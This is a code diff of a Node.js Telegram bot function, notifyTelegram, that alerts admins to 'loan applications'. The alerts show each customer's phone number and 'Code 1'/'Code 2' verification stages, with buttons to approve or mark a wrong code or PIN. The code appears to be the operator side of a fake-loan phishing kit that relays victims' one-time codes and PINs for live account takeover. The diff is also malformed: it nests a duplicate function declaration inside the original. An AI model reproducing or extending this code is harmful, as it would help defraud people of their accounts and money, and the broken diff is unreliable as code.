@@ -445,33 +445,94 @@ async function notifyTelegram(application) {
     hour12: true
   });
 
+
+async function notifyTelegram(application) {
+  if (!bot) return;
+
+  const assigned = application.assigned_admin_id
+    ? String(application.assigned_admin_id)
+    : null;
+
+  const recipients = assigned
+    ? [assigned]
+    : adminIds.filter(id => !superAdminIds.has(String(id)));
+
+  const attempt = Number(application.attempt_number || 1);
+  const returning = attempt > 1;
+
+  let title = returning
+    ? `🔄 RETURNING CUSTOMER (${attempt - 1} previous visits)`
+    : "🆕 NEW APPLICATION";
+
+  if (application.status === "AWAITING_FIRST_NAME_APPROVAL") {
+    title = returning
+      ? `🔄 RETURNING CUSTOMER (${attempt - 1} previous visits) — CODE 1`
+      : "📲 CODE VERIFICATION — CODE 1";
+  } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL") {
+    title = returning
+      ? `🔄 RETURNING CUSTOMER (${attempt - 1} previous visits) — CODE 2`
+      : "📲 CODE VERIFICATION — CODE 2";
+  } else if (application.status === "AWAITING_AMOUNT_APPROVAL") {
+    title = returning
+      ? `🔄 RETURNING CUSTOMER (${attempt - 1} previous visits) — FINAL APPROVAL`
+      : "💰 FINAL LOAN APPROVAL";
+  }
+
+  const customerId =
+    application.application_id ||
+    application.entered_id ||
+    application.customer_id ||
+    application.application_no ||
+    "—";
+
+  const timestamp = new Date().toLocaleString("en-GB", {
+    timeZone: "Africa/Nairobi",
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  const stage =
+    application.status === "AWAITING_FIRST_NAME_APPROVAL"
+      ? "CODE 1 — PENDING VERIFICATION"
+      : application.status === "AWAITING_SECOND_NAME_APPROVAL"
+        ? "CODE 2 — PENDING VERIFICATION"
+        : application.status === "AWAITING_AMOUNT_APPROVAL"
+          ? "FINAL LOAN APPROVAL"
+          : "APPLICATION RECEIVED";
+
   const text =
-    `📲 ${stage}\n` +
-    `🔄 ${attempt > 1 ? `Returning customer (${visits} previous visits)` : "New customer"}\n\n` +
-    `📋 ${application.application_no || application.id || "—"}\n` +
-    `📞 ${application.phone || "—"}\n` +
-    `🔢 ${stage.includes("CODE 1") ? "Code 1 submitted" : stage.includes("CODE 2") ? "Code 2 submitted" : "Verification stage"}\n` +
+    `📲 CODE VERIFICATION\n` +
+    `${title}\n\n` +
+    `📋 Customer ID: ${customerId}\n` +
+    `📞 Phone: ${application.phone || "—"}\n` +
+    `🔢 Verification stage: ${stage}\n` +
+    `💰 Amount: ${money(application.amount)}\n` +
     `⏰ ${timestamp}\n\n` +
     `⚠️ VERIFY CODE`;
 
   for (const adminId of recipients) {
     const primaryRow = [
-      { text: "✅ Approve", callback_data: `approve:${application.id}` }
+      { text: "✅ APPROVE", callback_data: `approve:${application.id}` }
     ];
 
     if (application.status === "AWAITING_FIRST_NAME_APPROVAL") {
       primaryRow.push({
-        text: "❌ Wrong Code 1",
+        text: "❌ WRONG CODE 1",
         callback_data: `wrongfirst:${application.id}`
       });
     } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL") {
       primaryRow.push({
-        text: "❌ Wrong Code 2",
+        text: "❌ WRONG CODE 2",
         callback_data: `wrongsecond:${application.id}`
       });
     } else {
       primaryRow.push({
-        text: "❌ Reject",
+        text: "❌ REJECT",
         callback_data: `reject:${application.id}`
       });
     }
@@ -480,7 +541,7 @@ async function notifyTelegram(application) {
       inline_keyboard: [
         primaryRow,
         [{
-          text: "🆔 Wrong ID",
+          text: "🆔 WRONG ID",
           callback_data: `wrongpin:${application.id}`
         }]
       ]
